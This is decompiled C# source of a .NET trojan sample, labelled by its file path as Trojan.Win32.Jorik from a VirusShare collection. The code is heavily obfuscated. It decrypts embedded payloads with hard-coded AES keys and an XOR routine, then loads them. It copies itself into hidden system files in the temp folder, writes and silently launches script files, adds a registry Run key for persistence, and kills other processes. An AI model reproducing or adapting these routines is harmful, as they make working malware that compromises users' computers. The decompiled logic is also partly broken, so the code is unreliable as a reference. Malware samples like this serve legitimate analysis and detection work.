// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ccy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc6f4431894d1c97
// MVID: 2A74CDCD-1E5F-40DD-90C8-12E38E6596C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Jorik.Llac.cfi-7d3f633a775aae62503ba637b47672afca334a930966f3c35ac40563155370b2.exe

using \u0001;
using \u0007;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0007
{
  internal sealed class \u0006
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;

    static \u0006()
    {
      \u0002.\u0002(typeof (\u0006));
      bool flag = false;
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      \u0006.\u0083(executingAssembly.Location, true, ref flag);
      if (!flag || !executingAssembly.FullName.EndsWith(\u0006.\u0001(3145)))
        throw new SecurityException(\u0006.\u0001(3170));
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode, PreserveSig = false)]
    [return: MarshalAs(UnmanagedType.U1)]
    private static extern bool \u0083([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.U1)] bool _param1, [MarshalAs(UnmanagedType.U1)] ref bool _param2);

    [STAThread]
    public static void \u0002()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = 1;
label_1:
        int num3 = 2;
        \u0006.\u0015();
label_2:
        if (true)
          num3 = 3;
        \u0006.\u0010();
label_3:
        num3 = 4;
        \u0006.\u000E();
label_4:
        num3 = 5;
        if (\u0006.\u0007(\u0006.\u0001(3207)))
          goto label_18;
label_5:
        num3 = 6;
        string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0001(3077);
label_6:
        num3 = 7;
        string tempPath = Path.GetTempPath();
label_7:
        num3 = 8;
        int num4 = File.Exists(tempPath + \u0006.\u0001(3224)) ? 1 : 0;
        if (true)
        {
          if (num4 != 0)
            goto label_15;
        }
        else
          goto label_39;
label_9:
        num3 = 9;
        \u0006.\u0006();
label_10:
        num3 = 10;
        \u0006.\u0014();
label_11:
        if (true)
        {
          if (true)
          {
            num3 = 11;
            \u0006.\u0013();
          }
          else
            goto label_9;
        }
        else
          goto label_44;
label_14:
        num3 = 12;
        \u0006.\u0017();
        goto label_18;
label_15:
        int num5 = 14;
label_16:
        num3 = num5;
label_17:
        num3 = 15;
        \u0006.\u0018();
label_18:
        num3 = 18;
        string s1 = \u0006.\u0001(3245);
label_19:
        num3 = 19;
        byte[] numArray1 = \u0006.\u0002(Convert.FromBase64String(s1));
label_20:
        num3 = 20;
        string str2;
        string s2 = str2;
label_21:
        num3 = 21;
        byte[] numArray2 = \u0006.\u0002(Convert.FromBase64String(s2), \u0006.\u0001(581273));
label_22:
        num3 = 22;
        string str3;
        string s3 = str3;
label_23:
        num3 = 23;
        \u0006.\u0002(Convert.FromBase64String(s3));
label_24:
        num5 = 24;
        if (num5 != 0)
        {
          num3 = num5;
          \u0006.\u0003();
        }
        else
          goto label_16;
label_26:
        num3 = 25;
        fjdsioprj35io32io5jm23iomriaomIOMFSOIDMR53IO2MIOmoi34mio5m23io5moiMOIMWEOIM534IOM5OIMIomio4m32io5m32oimIOMIOQWM5IOMiom43io2m5iom324imioMIOGMSOTI3.\u0002(numArray1, \u0006.\u0001(581350));
label_27:
        int num6;
        if (true)
        {
          num3 = 26;
          if (true)
          {
            fjdsioprj35io32io5jm23iomriaomIOMFSOIDMR53IO2MIOmoi34mio5m23io5moiMOIMWEOIM534IOM5OIMIomio4m32io5m32oimIOMIOQWM5IOMiom43io2m5iom324imioMIOGMSOTI3.\u0002(numArray2, \u0006.\u0001(581350));
          }
          else
          {
            num6 = num1;
            goto label_47;
          }
        }
        else
          goto label_36;
label_30:
        num3 = 27;
        if (\u0006.\u0002(\u0006.\u0001(581387)))
          goto label_33;
label_31:
        num3 = 28;
        if (\u0006.\u0004(\u0006.\u0001(3224)))
          goto label_33;
label_32:
        num3 = 29;
        \u0006.\u0011();
label_33:
        num3 = 32;
        if (true)
        {
          if (\u0006.\u0003(\u0006.\u0001(581404)))
            goto label_37;
        }
        else
          goto label_18;
label_35:
        num3 = 33;
label_36:
        \u0006.\u0012();
label_37:
        num3 = 35;
        \u0006.\u0005();
label_38:
        num4 = 36;
label_39:
        num3 = num4;
        \u0006.\u0019();
label_40:
        num3 = 37;
        \u0006.\u0008();
label_41:
        num3 = 38;
        \u0006.\u0007();
label_42:
        num3 = 39;
        \u0006.\u000F();
label_43:
        num3 = 40;
        \u0006.\u0004();
label_44:
        num3 = 41;
        \u0006.\u0016();
        ProjectData.EndApp();
        goto label_55;
label_47:
        num1 = 0;
        switch (num6)
        {
          case 1:
            goto label_0;
          case 2:
            goto label_1;
          case 3:
            goto label_2;
          case 4:
            goto label_3;
          case 5:
            goto label_4;
          case 6:
            goto label_5;
          case 7:
            goto label_6;
          case 8:
            goto label_7;
          case 9:
            goto label_9;
          case 10:
            goto label_10;
          case 11:
            goto label_11;
          case 12:
            goto label_14;
          case 13:
          case 16:
          case 17:
          case 18:
            goto label_18;
          case 14:
            goto label_15;
          case 15:
            goto label_17;
          case 19:
            goto label_19;
          case 20:
            goto label_20;
          case 21:
            goto label_21;
          case 22:
            goto label_22;
          case 23:
            goto label_23;
          case 24:
            goto label_24;
          case 25:
            goto label_26;
          case 26:
            goto label_27;
          case 27:
            goto label_30;
          case 28:
            goto label_31;
          case 29:
            goto label_32;
          case 30:
          case 31:
          case 32:
            goto label_33;
          case 33:
            goto label_35;
          case 34:
          case 35:
            goto label_37;
          case 36:
            goto label_38;
          case 37:
            goto label_40;
          case 38:
            goto label_41;
          case 39:
            goto label_42;
          case 40:
            goto label_43;
          case 41:
            goto label_44;
          case 42:
            goto label_55;
          default:
            goto label_54;
        }
label_48:
        num1 = num3;
        switch (num2)
        {
          case 1:
            num6 = num1 + 1;
            goto label_47;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_48;
      }
label_54:
      throw ProjectData.CreateProjectError(-2146828237);
label_55:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \u0003()
    {
      string Source = \u0006.\u0001(581417);
      int num1 = 6;
      string str;
      while (true)
      {
        str = Conversions.ToString(num1);
        FileSystem.FileCopy(Source, \u0006.\u0001(581350));
        int num2;
        do
        {
          num2 = 0;
          if (num2 == 0)
          {
            if (true)
            {
              if (num2 == 0)
                num2 = 0;
              else
                goto label_7;
            }
          }
          else
            goto label_8;
        }
        while (num2 != 0);
        goto label_6;
label_8:
        num1 = num2;
      }
label_7:
      return;
label_6:
      File.SetAttributes(\u0006.\u0001(581350), (FileAttributes) Conversions.ToInteger(str));
    }

    public static void \u0004()
    {
      Thread.Sleep(20001);
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0001(3077);
      string path;
      string tempPath;
      FileAttributes fileAttributes;
      do
      {
        tempPath = Path.GetTempPath();
        fileAttributes = FileAttributes.Hidden | FileAttributes.System;
        path = tempPath + \u0006.\u0001(581490);
        File.SetAttributes(tempPath + \u0006.\u0001(581503), fileAttributes);
        File.SetAttributes(tempPath + \u0006.\u0001(581524), fileAttributes);
      }
      while (false);
      string str2 = \u0006.\u0001(581537);
      string str3 = \u0006.\u0001(581550);
      string str4 = \u0006.\u0001(581567);
      string str5 = \u0006.\u0001(581580);
      do
      {
        if (true)
        {
          File.Delete(tempPath + \u0006.\u0001(3077) + str2);
          File.Delete(tempPath + \u0006.\u0001(3077) + str4);
          File.Delete(tempPath + \u0006.\u0001(581597));
          if (File.Exists(tempPath + \u0006.\u0001(581618)))
            goto label_7;
        }
        string str6 = \u0006.\u0001(581635);
label_6:
        File.Delete(tempPath + \u0006.\u0001(3077) + str6);
label_7:
        File.SetAttributes(path, fileAttributes);
        string str7 = \u0006.\u0001(581580);
        string str8 = \u0006.\u0001(581648);
        string str9 = \u0006.\u0001(581665);
        string str10 = \u0006.\u0001(581682);
        string str11 = \u0006.\u0001(581699);
        if (true)
        {
          string str12 = \u0006.\u0001(581716);
          string str13 = \u0006.\u0001(581733);
          do
          {
            string str14 = \u0006.\u0001(581750);
          }
          while (false);
        }
        else
          goto label_6;
      }
      while (false);
    }

    public static void \u0005()
    {
      int num = Operators.CompareString(\u0006.\u0001(581767), \u0006.\u0001(581776), false);
      if (true)
      {
        if (num != 0)
          goto label_10;
      }
      else
        goto label_6;
label_3:
      string str1 = \u0006.\u0001(581797);
      object obj = (object) \u0006.\u0001(581802);
      if (true)
      {
        if (true)
        {
          string str2 = \u0006.\u0001(581811);
          num = File.Exists(\u0006.\u0001(581828)) ? 1 : 0;
        }
        else
          goto label_8;
      }
      else
        goto label_7;
label_6:
      if (num != 0)
        ;
label_7:
      string str3 = \u0006.\u0001(581849);
      if (true)
        ;
label_8:
      string str4 = \u0006.\u0001(581866);
      if (true)
        goto label_12;
label_9:
      string str5 = \u0006.\u0001(581883);
      goto label_10;
label_12:
      goto label_9;
label_10:
      if (false)
        goto label_3;
    }

    public static void \u0006()
    {
      int num = 387218;
      if (num != 0 && num != 0)
        num = 1345542848;
      string str1;
      if (true)
        str1 = \u0006.\u0001(581503);
      string str2 = Conversions.ToString(7);
      do
      {
        File.Delete(str2 + str1);
      }
      while (false);
    }

    public static void \u0007()
    {
      int num1 = Operators.CompareString(\u0006.\u0001(581900), \u0006.\u0001(581776), false);
      if (true)
      {
        if (num1 != 0)
          goto label_10;
      }
      else
        goto label_7;
label_3:
      string str1 = \u0006.\u0001(581550);
label_4:
      int num2 = 2;
      if (num2 != 0)
      {
        if (num2 != 0)
        {
          string str2 = \u0006.\u0001(581580);
          string str3 = \u0006.\u0001(581909);
          num1 = 1;
        }
        else
          goto label_9;
      }
      else
        num1 = num2;
label_7:
      if (num1 != 0)
      {
        string str4 = \u0006.\u0001(581918);
      }
      else
        goto label_3;
label_9:
      string str5 = \u0006.\u0001(581935);
      string str6 = \u0006.\u0001(581550);
      string str7 = \u0006.\u0001(581580);
label_10:
      if (false)
        goto label_4;
    }

    public static void \u0008()
    {
      string Left = \u0006.\u0001(581952);
      while (Operators.CompareString(Left, \u0006.\u0001(581776), false) == 0)
      {
        string str1 = \u0006.\u0001(581849);
        if (true)
        {
          if (false)
            continue;
        }
        else
          goto label_5;
label_4:
        string str2 = \u0006.\u0001(581866);
        string str3 = \u0006.\u0001(581883);
label_5:
        if (true)
        {
          string str4 = \u0006.\u0001(581961);
          break;
        }
        goto label_4;
      }
    }

    public static void \u000E()
    {
      string str1 = \u0006.\u0001(581978);
      string str2 = \u0006.\u0001(581995);
      string str3 = \u0006.\u0001(582012);
      if (false)
        return;
      string str4 = \u0006.\u0001(581918);
      string str5 = \u0006.\u0001(582029) + Path.GetTempPath() + \u0006.\u0001(582029);
      string str6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0001(3077);
      if (File.Exists(str5 + \u0006.\u0001(581503)))
        ;
    }

    public static byte[] \u0002([In] byte[] obj0)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(obj0, 0, obj0.Length);
      }
    }

    public static byte[] \u0002([In] byte[] obj0, [In] string obj1)
    {
      byte[] bytes = Encoding.Default.GetBytes(obj1);
      int num1 = (int) obj0[checked (obj0.Length - 1)];
      int num2 = 112;
      if (num2 != 0)
      {
        num1 ^= num2;
        goto label_18;
      }
label_4:
      int num3;
      if (num2 != 0)
      {
        byte[] arySrc = new byte[checked (num1 + 1)];
        int num4 = 0;
        int num5 = obj0.Length;
        while (true)
        {
          int num6 = 1;
          int num7;
          int num8;
          while (true)
          {
            int num9 = checked (num5 - num6);
            int index1 = num4;
            int num10;
            int length;
            int num11;
            while (true)
            {
              do
              {
                num7 = index1;
                num8 = num9;
                if (true)
                {
                  if (num7 <= num8)
                  {
                    int index2;
                    arySrc[index1] = checked ((byte) ((int) obj0[index1] ^ num3 ^ (int) bytes[index2]));
                    num10 = index2;
                    length = obj1.Length;
                    num11 = 1;
                    if (num11 != 0)
                    {
                      int num12 = checked (length - num11);
                      if (num10 == num12)
                      {
                        if (true)
                          index2 = 0;
                      }
                      else
                        checked { ++index2; }
                    }
                    else
                      goto label_2;
                  }
                  else
                    goto label_17;
                }
                else
                  goto label_3;
              }
              while (false);
              checked { ++index1; }
            }
label_2:
            num6 = num11;
            num5 = length;
            num4 = num10;
          }
label_3:
          num5 = num8;
          num4 = num7;
        }
label_17:
        return (byte[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new byte[checked (obj0.Length - 2 + 1)]);
      }
label_18:
      num3 = num1;
      int length1 = obj0.Length;
      num2 = 3;
      num1 = length1;
      goto label_4;
    }

    private static bool \u0002([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582030));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0003([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582039));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0004([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582048));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0005([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582061));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0006([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582066));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    private static bool \u0007([In] string obj0)
    {
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582071));
      int index;
      if (true)
      {
        if (true)
        {
          index = 0;
          goto label_7;
        }
      }
      else
        goto label_6;
label_4:
      if (false)
        goto label_8;
      else
        goto label_8;
label_6:
      int num;
      index = checked (num + 1);
label_7:
      bool flag;
      if (index < processesByName.Length)
      {
        if (processesByName[index] == null)
        {
          flag = false;
          goto label_4;
        }
        else
          flag = true;
      }
label_8:
      return flag;
    }

    public static void \u000F()
    {
label_0:
      Process[] processesByName = Process.GetProcessesByName(\u0006.\u0001(582084));
label_18:
      int num1 = processesByName.Length;
      if (true)
      {
        if (num1 <= 0)
          return;
        num1 = 0;
      }
label_19:
      int num2 = checked (processesByName.Length - 1);
      int index = num1;
      while (index <= num2)
      {
        int num3 = processesByName[index].HasExited ? 1 : 0;
        if (true)
        {
          if (num3 != 0)
            goto label_12;
label_7:
          double num4 = (double) processesByName[index].WorkingSet64;
          double num5;
          while (true)
          {
            num5 = num4 / 1024.0;
            if (false)
              num4 = num5;
            else
              break;
          }
          if (num5 < 130.0)
          {
            try
            {
              processesByName[index].Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              int num6 = (int) MessageBox.Show(ex.Message);
              ProjectData.ClearProjectError();
            }
          }
label_12:
          if (true)
          {
            if (true)
            {
              if (true)
                checked { ++index; }
              else
                goto label_7;
            }
            else
              goto label_0;
          }
          else
            goto label_18;
        }
        else
        {
          num1 = num3;
          goto label_19;
        }
      }
    }

    public static void \u0010()
    {
      if (Operators.CompareString(\u0006.\u0001(582093), \u0006.\u0001(581776), false) != 0)
        ;
    }

    private static void \u0011()
    {
      Environment.GetEnvironmentVariable(\u0006.\u0001(582102));
      if (true)
        ;
      string s;
      \u0006.\u0002(Convert.FromBase64String(s));
    }

    public static void \u0012()
    {
    }

    public static void \u0013()
    {
      if (Operators.CompareString(\u0006.\u0001(581776), \u0006.\u0001(581776), false) != 0)
        return;
      int folder = 26;
      StreamWriter streamWriter;
      while (true)
      {
        string str1 = Environment.GetFolderPath((Environment.SpecialFolder) folder) + \u0006.\u0001(3077);
        string str2 = \u0006.\u0001(582029) + Path.GetTempPath() + \u0006.\u0001(582029);
        string str3 = str2 + \u0006.\u0001(581597);
        string executablePath = Application.ExecutablePath;
        string str4 = \u0006.\u0001(582111);
        string str5 = \u0006.\u0001(582128);
        FileSystem.FileCopy(executablePath, str2 + \u0006.\u0001(581597));
        string path = str2 + \u0006.\u0001(582145);
        do
        {
          streamWriter = new StreamWriter(path);
          string str6 = \u0006.\u0001(582158);
          string str7 = \u0006.\u0001(582179);
          string str8 = \u0006.\u0001(582200);
          streamWriter.Write(\u0006.\u0001(582221));
        }
        while (false);
        int num = 1345542848;
        if (num == 0)
        {
          folder = num;
        }
        else
        {
          folder = num;
          break;
        }
      }
      streamWriter.Dispose();
    }

    private static void \u0014()
    {
      string Left = \u0006.\u0001(581776);
      if (true)
        goto label_8;
label_1:
      if (true)
        ;
      if (Operators.CompareString(Left, \u0006.\u0001(581776), false) != 0)
        return;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0001(3077);
      string str2 = \u0006.\u0001(582326);
      string str3;
      string str4;
      string str5;
      string str6;
      string str7;
      int num;
      if (true)
      {
        str3 = str2 + \u0006.\u0001(582363);
        str4 = \u0006.\u0001(582424);
        string str8 = \u0006.\u0001(582030);
        str5 = \u0006.\u0001(582429) + \u0006.\u0001(582434);
        str6 = \u0006.\u0001(582439) + \u0006.\u0001(582452);
        str7 = \u0006.\u0001(582465);
        num = 72273848;
      }
      else
        goto label_6;
label_5:
      string str9 = \u0006.\u0001(582478);
      string str10 = \u0006.\u0001(582499);
      string tempPath = Path.GetTempPath();
label_6:
      StreamWriter streamWriter = new StreamWriter(tempPath + \u0006.\u0001(581618));
      streamWriter.Write(str4 + \u0006.\u0001(582504) + str6 + str5 + \u0006.\u0001(582513) + str3 + \u0006.\u0001(582518));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(str9 + str10 + \u0006.\u0001(582523) + str7 + \u0006.\u0001(582544));
      num = 387218;
      if (num != 0)
      {
        streamWriter.Dispose();
        return;
      }
      goto label_5;
label_8:
      goto label_1;
    }

    public static void \u0015()
    {
      if (Operators.CompareString(\u0006.\u0001(582565), \u0006.\u0001(581776), false) != 0)
        return;
      string tempPath = Path.GetTempPath();
      if (true)
        goto label_8;
label_1:
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0001(3077);
      string str2;
      StreamWriter streamWriter = new StreamWriter(str2 + \u0006.\u0001(581524));
      if (true)
      {
        streamWriter.Write(\u0006.\u0001(582586));
        streamWriter.Write(Environment.NewLine);
        do
        {
          streamWriter.Write(\u0006.\u0001(582599));
        }
        while (false);
        streamWriter.Write(Environment.NewLine);
      }
      streamWriter.Write(\u0006.\u0001(582636) + str2 + \u0006.\u0001(582544));
      streamWriter.Write(Environment.NewLine);
      streamWriter.Write(\u0006.\u0001(582657));
      streamWriter.Dispose();
      return;
label_8:
      str2 = tempPath;
      goto label_1;
    }

    public static void \u0016()
    {
      int folder = \u0006.\u0006(\u0006.\u0001(582066)) ? 1 : 0;
      string tempPath;
      if (true)
      {
        if (true)
        {
          if (folder == 0)
            folder = 1;
          else
            goto label_9;
        }
        if (folder != 0)
          goto label_10;
label_5:
        folder = 26;
        goto label_11;
label_10:
        tempPath = Path.GetTempPath();
        goto label_5;
      }
      else
        goto label_11;
label_8:
      ProcessStartInfo startInfo;
      Process.Start(startInfo);
label_9:
      if (true)
        return;
      goto label_8;
label_11:
      string str = Environment.GetFolderPath((Environment.SpecialFolder) folder) + \u0006.\u0001(3077);
      do
      {
        startInfo = new ProcessStartInfo(tempPath + \u0006.\u0001(582674));
      }
      while (false);
      startInfo.CreateNoWindow = true;
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
      goto label_8;
    }

    public static void \u0017()
    {
      int num1 = Operators.CompareString(\u0006.\u0001(581776), \u0006.\u0001(581776), false);
      string str1;
      int num2;
      while (true)
      {
        if (num1 == 0)
        {
          string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006.\u0001(3077);
          str1 = \u0006.\u0001(582029) + Path.GetTempPath() + \u0006.\u0001(582029);
          num2 = 2;
          if (num2 == 0)
            num1 = num2;
          else
            goto label_4;
        }
        else
          break;
      }
      return;
label_4:
      if (num2 != 0)
      {
        string str3 = str1 + \u0006.\u0001(582687);
        StreamWriter streamWriter = new StreamWriter(str3);
        if (true)
        {
          string str4 = \u0006.\u0001(582111);
          if (true)
          {
            string str5 = \u0006.\u0001(582700);
            string str6 = \u0006.\u0001(582717);
            string str7 = \u0006.\u0001(582734);
            string str8 = \u0006.\u0001(582751);
            string str9 = \u0006.\u0001(582128);
          }
          else
            goto label_9;
label_8:
          streamWriter.Write(\u0006.\u0001(582768));
          streamWriter.Dispose();
          ProcessStartInfo startInfo = new ProcessStartInfo(str3);
label_9:
          string str10 = \u0006.\u0001(582111);
          string str11 = \u0006.\u0001(582700);
          string str12 = \u0006.\u0001(582717);
          string str13 = \u0006.\u0001(582734);
          string str14 = \u0006.\u0001(582751);
          if (true)
          {
            string str15 = \u0006.\u0001(582128);
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(startInfo);
            string str16 = \u0006.\u0001(582111);
            string str17 = \u0006.\u0001(582700);
          }
          else
            goto label_8;
        }
        else
          goto label_13;
      }
      do
      {
        string str18 = \u0006.\u0001(582717);
      }
      while (false);
      string str19 = \u0006.\u0001(582734);
      string str20 = \u0006.\u0001(582751);
      string str21 = \u0006.\u0001(582128);
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0006.\u0001(582833), true);
label_13:
      registryKey.SetValue(\u0006.\u0001(582894), (object) (str1 + \u0006.\u0001(3224)));
    }

    public static void \u0018()
    {
      int folder = 26;
      if (folder != 0)
        goto label_11;
label_2:
      string executablePath;
      string Destination;
      if (folder == 0)
      {
        string str1 = \u0006.\u0001(582907);
        FileSystem.FileCopy(executablePath, Destination);
        string str2 = \u0006.\u0001(582924);
      }
      else
        goto label_8;
label_4:
      string str3 = \u0006.\u0001(582941);
label_5:
      if (true)
      {
        if (true)
        {
          string str4 = \u0006.\u0001(582958);
          string str5 = \u0006.\u0001(581811);
        }
        else
          goto label_13;
      }
      else
        goto label_4;
label_8:
      RegistryKey localMachine = Registry.LocalMachine;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0006.\u0001(582833), true);
      string str6;
      if (true)
      {
        if (true)
        {
          registryKey.SetValue(\u0006.\u0001(582894), (object) str6);
          return;
        }
        goto label_5;
      }
      else
        goto label_13;
label_11:
      string str7 = Environment.GetFolderPath((Environment.SpecialFolder) folder) + \u0006.\u0001(3077);
      if (true)
        goto label_12;
label_1:
      string str8 = \u0006.\u0001(582029) + Path.GetTempPath() + \u0006.\u0001(582029);
      goto label_13;
label_12:
      goto label_1;
label_13:
      Destination = str8 + \u0006.\u0001(581503);
      str6 = str8 + \u0006.\u0001(3224);
      executablePath = Application.ExecutablePath;
      folder = 0;
      goto label_2;
    }

    private static void \u0019()
    {
      string Left;
      if (true)
        Left = \u0006.\u0001(582975);
      if (Operators.CompareString(Left, \u0006.\u0001(581776), false) != 0)
        return;
      string str1 = \u0006.\u0001(582984);
      do
      {
        string str2 = \u0006.\u0001(583001);
        string str3 = \u0006.\u0001(583018);
        string str4 = \u0006.\u0001(583035);
        if (true)
          goto label_10;
label_5:
        string str5;
        do
        {
          str5 = \u0006.\u0001(583052);
        }
        while (false);
        if (!\u0006.\u0005(str5 + \u0006.\u0001(583057)))
        {
          string str6 = \u0006.\u0001(582111);
          string str7 = \u0006.\u0001(582700);
          string str8 = \u0006.\u0001(582717);
          string str9 = \u0006.\u0001(582734);
          string str10 = \u0006.\u0001(582751);
          continue;
        }
        goto label_2;
label_10:
        goto label_5;
      }
      while (false);
      goto label_8;
label_2:
      return;
label_8:
      string str11 = \u0006.\u0001(582128);
    }
  }
}
